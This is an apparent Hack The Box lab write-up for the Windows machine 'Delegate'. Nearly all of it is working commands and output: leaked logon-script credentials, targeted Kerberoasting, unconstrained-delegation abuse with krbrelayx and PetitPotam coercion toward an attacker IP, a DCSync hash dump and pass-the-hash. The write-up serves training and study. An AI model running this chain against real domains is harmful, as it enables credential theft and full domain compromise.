# HTB Write-Up: Delegate

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Delegate) |
| Difficulty | Medium |
| OS | Windows |
| Date | October 26, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration — SMB/SYSVOL Logon Script & Leaked Credentials](#enumeration-smbsysvol-logon-script-leaked-credentials)
3. [Initial Access — BloodHound & Targeted Kerberoasting](#initial-access-bloodhound-targeted-kerberoasting)
4. [Privilege Escalation — Unconstrained Delegation Abuse](#privilege-escalation-unconstrained-delegation-abuse)
5. [Domain Compromise — DCSync & Administrator Access](#domain-compromise-dcsync-administrator-access)

## Reconnaissance

Port discovery was performed with **RustScan**:

```bash
rustscan -a 10.129.234.69 --ulimit=5000
```

A detailed service scan followed to identify the FQDN:

```bash
nmap -sC -sV -p 53,389,445,464,593,636,5985 10.129.234.69
```

**Notable Open Ports:**

| Port | Service |
| --- | --- |
| 53 | DNS |
| 389 / 636 | LDAP / LDAPS |
| 445 | SMB |
| 464 | Kerberos Password Change |
| 5985 | WinRM |
| 9389 | .NET Message Framing |

The LDAP banner confirmed the domain: **`delegate.vl`**, hostname **DC1**, running Windows Server 2022.

## Enumeration — SMB/SYSVOL Logon Script & Leaked Credentials

### 2.1 — Guest SMB Access

```bash
netexec smb 10.129.234.69 -u "guest" -p "" --shares
```

Only the default shares were listed (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`). The domain was added for local resolution:

```bash
echo "10.129.234.69 delegate.vl dc.delegate.vl" | sudo tee -a /etc/hosts
```

### 2.2 — Finding a Logon Script

`SYSVOL` was browsed anonymously:

```bash
smbclient //10.129.234.69/SYSVOL -N
smb: \> recurse on
smb: \> ls
```

A `scripts` folder under the domain held **`users.bat`** — a logon script pushed out to clients:

```bash
smb: \delegate.vl\scripts\> get users.bat
```

```bat
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123
```

The script's logic: when the logged-in user is **`A.Briggs`**, it mounts a share on a separate machine (`\\fileserver`) using **`Administrator:P4ssw0rd1#123`** — a credential hardcoded into a logon script readable by anyone, including anonymously over SMB.

## Initial Access — BloodHound & Targeted Kerberoasting

### 3.1 — Validating the Leaked Credential

The password worked for `A.Briggs` directly, not for `Administrator`:

```bash
netexec smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123' --shares
# [+] delegate.vl\A.Briggs:P4ssw0rd1#123

netexec winrm 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'
# [-] delegate.vl\A.Briggs:P4ssw0rd1#123
```

SMB access confirmed, but no WinRM — `A.Briggs` is a valid but low-privileged account.

### 3.2 — BloodHound Analysis

```bash
bloodhound-python -ns 10.129.234.69 -d delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' -c All --zip
```

The graph showed `A.Briggs` holds **GenericWrite** over **`N.Thompson`**, who in turn has **PSRemote (CanPSRemote)** rights on DC1 — and is a member of the **"Delegation Admins"** group, a detail that becomes critical in the next stage.

### 3.3 — Targeted Kerberoasting N.Thompson

GenericWrite is enough to temporarily add an SPN to the target account, making it roastable:

```bash
python3 targetedKerberoast.py -v -d delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123' --request-user N.THOMPSON
```

```
[VERBOSE] SPN added successfully for (N.Thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$32fdba8fb98c0b39120f0b5aa7e99037$...
[VERBOSE] SPN removed successfully for (N.Thompson)
```

### 3.4 — Cracking the Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
```

**Result:**

```
KALEB_2341       (?)
```

Recovered credentials: **`N.Thompson:KALEB_2341`**

### 3.5 — Shell Access & User Flag

```bash
evil-winrm -i 10.129.234.69 -u N.Thompson -p 'KALEB_2341'
```

```powershell
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\N.Thompson\Desktop> type user.txt
35600f74a39b2be3f1202677f10f2fac
```

## Privilege Escalation — Unconstrained Delegation Abuse

### The Ultimate Goal

The objective of this stage is to take full control of the Domain Controller (DC1) and extract every user's password hash from the Active Directory database. This is achieved by abusing a privilege called **SeEnableDelegationPrivilege**, which `N.Thompson` holds (inherited through membership in the **Delegation Admins** group noted earlier). This privilege allows configuring a computer object to use **Unconstrained Delegation**. In Active Directory, when a machine has Unconstrained Delegation enabled, any account that connects to it leaves a copy of its Kerberos Ticket Granting Ticket (TGT) in that machine's memory. By forcing the Domain Controller (`DC1$`) to connect to a machine under attacker control, its own identity ticket can be stolen and used to dump the entire domain database.

### Step 1 — Creating a Controlled Machine Account

By default, Active Directory allows ordinary users to add a limited number of new computer accounts to the domain (controlled by a setting called **MachineAccountQuota**). Since a machine is needed where delegation settings can be configured, a fake machine account named `UwU$` was created:

```bash
impacket-addcomputer -dc-ip 10.129.234.69 -computer-pass TestPassword321 -computer-name UwU delegate.vl/N.Thompson:'KALEB_2341'
```

```
[*] Successfully added machine account UwU$ with password TestPassword321.
```

### Step 2 — Linking the Machine Account to Our IP via DNS

When other systems in the network try to talk to the newly created `UwU` computer, they need to know where to find it. A DNS tool is used to create a new DNS record, pointing `UwU.delegate.vl` directly at the attack machine's IP address (`10.10.14.25`). This ensures all incoming network traffic meant for `UwU` comes straight to the attacker:

```bash
python3 dnstool.py -u 'delegate.vl\UwU$' -p TestPassword321 -r UwU.delegate.vl -d 10.10.14.25 --action add DC1.delegate.vl -dns-ip 10.129.234.69
```

```
[+] LDAP operation completed successfully
```

### Step 3 — Turning On Unconstrained Delegation

This is where `N.Thompson`'s special privilege (**SeEnableDelegationPrivilege**) comes into play. The fake machine account's properties are modified to add the **`TRUSTED_FOR_DELEGATION`** flag. This tells the entire domain: "This computer is highly trusted. Whenever a user authenticates to it, safe-keep a copy of their login ticket in its memory."

```bash
bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host 'DC1.delegate.vl' add uac 'UwU$' -f TRUSTED_FOR_DELEGATION
```

```
[+] ['TRUSTED_FOR_DELEGATION'] property flags added to UwU$'s userAccountControl
```

### Step 4 — Registering a Service Principal Name (SPN)

Kerberos authentication requires systems to have an assigned Service Principal Name (SPN) so that applications know what type of service they are connecting to. A generic file-sharing service name (`cifs/UwU.delegate.vl`) is added to the computer account. Without an SPN, the Domain Controller will refuse to complete the authentication handshake with the fake machine:

```bash
python3 ./addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.129.234.69 DC1.delegate.vl --additional
python3 ./addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/UwU.delegate.vl' -t 'UwU$' -dc-ip 10.129.234.69 DC1.delegate.vl
```

```
[+] SPN Modified successfully
```

### Step 5 — Setting Up the Ticket Trap

With the trap machine fully configured in Active Directory, the next step is to sit and wait for incoming connections. **krbrelayx** is run, providing the NT hash of the `UwU$` machine account. This tool listens on local ports, waiting to capture any Kerberos tickets delivered to it:

```bash
python3 ./krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC
```

```
[*] Running in unconstrained delegation abuse mode using the specified credentials.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
```

### Step 6 — Forcing the Domain Controller to Connect to Us

The Domain Controller needs to be made to log into the attacker's machine so it gives up its ticket. **PetitPotam** exploits a built-in Windows feature (via MS-EFSRPC) to trigger a forced connection. The Domain Controller (`10.129.234.69`) is commanded to instantly connect to the malicious machine (`UwU.delegate.vl`). Because that machine has Unconstrained Delegation enabled, the Domain Controller willingly hands over a copy of its highly privileged `DC1$` TGT, which the krbrelayx listener immediately grabs and saves:

```bash
python3 PetitPotam.py -u 'UwU$' -p 'TestPassword321' UwU.delegate.vl 10.129.234.69
```

```
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

Back on the krbrelayx terminal, the ticket arrived:

```
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

### Step 7 — Loading the Stolen Ticket

With the Domain Controller's own TGT captured, it was loaded into the local session:

```bash
export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
klist
```

```
Default principal: DC1$@DELEGATE.VL
Service principal: krbtgt/DELEGATE.VL@DELEGATE.VL
```

## Domain Compromise — DCSync & Administrator Access

### Stealing All Domain Hashes

With the Domain Controller's own ticket captured, the `DC1$` account's ultimate right to replicate domain data (**DCSync**) was used directly. **secretsdump** was run using the stolen ticket to ask Active Directory to dump the password hashes of every account in the domain:

```bash
impacket-secretsdump 'DC1$'@DC1.delegate.vl -k -no-pass
```

**Output:**

```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
UwU$:4601:aad3b435b51404eeaad3b435b51404ee:c7be3644a2eb37c9bb1f248e9e0b9afc:::
```

### Root Flag via Pass-the-Hash

The **Administrator** NT hash was used directly for a final WinRM login:

```bash
evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
d6baf739469e8d35108826aeddf382c8
```
